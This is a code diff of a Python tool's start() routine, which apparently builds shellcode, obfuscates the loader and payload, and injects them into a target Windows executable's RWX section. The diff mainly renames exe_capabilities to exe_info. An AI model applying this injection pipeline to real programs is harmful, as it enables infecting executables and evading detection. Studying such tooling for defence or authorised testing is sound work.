@@ -137,19 +137,16 @@ def start():
         clean_files()
         delete_all_files_in_directory("logs/")
 
-    # Load our payload
+    # Load our input
     project.load_payload()
-
-    # Check: Destination EXE capabilities
-    project.exe_capabilities = ExeCapabilities([
+    project.load_injectable([
         "GetEnvironmentVariableW",
         "VirtualAlloc"
     ])
-    project.exe_capabilities.parse_from_exe(project.inject_exe_in)
-    project.exe_capabilities.print()
+    project.exe_info.print()
 
     # choose which source / technique we gonna use
-    if project.exe_capabilities.has_all():
+    if project.exe_info.has_all():
         project.source_style = SourceStyle.iat_reuse
     else:
         logger.info("--[ Some imports are missing for the shellcode to use IAT_REUSE")
@@ -169,8 +166,8 @@ def start():
         phases.compiler.compile(
             c_in = main_c_file, 
             asm_out = main_asm_file, 
-            payload_len = project.payload_length, 
-            exe_capabilities = project.exe_capabilities)
+            payload_len = len(project.payload_data), 
+            exe_info = project.exe_info)
 
     # Assemble: ASM -> Shellcode
     if project.generate_shc_from_asm:
@@ -205,9 +202,9 @@ def start():
         shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))
 
     # RWX Injection
-    if project.exe_capabilities.rwx_section != None:
+    if project.exe_info.rwx_section != None:
         logger.info("--[ RWX section {} found. Will obfuscate loader+payload and inject into it".format(
-            project.exe_capabilities.rwx_section.Name.decode().rstrip('\x00')
+            project.exe_info.rwx_section.Name.decode().rstrip('\x00')
         ))
         obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")
         observer.add_code("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
@@ -220,7 +217,7 @@ def start():
             shellcode_in = main_shc_file,
             exe_in = project.inject_exe_in,
             exe_out = project.inject_exe_out,
-            exe_capabilities = project.exe_capabilities
+            exe_info = project.exe_info
         )
         if project.verify:
             logger.info("--[ Verify infected exe")
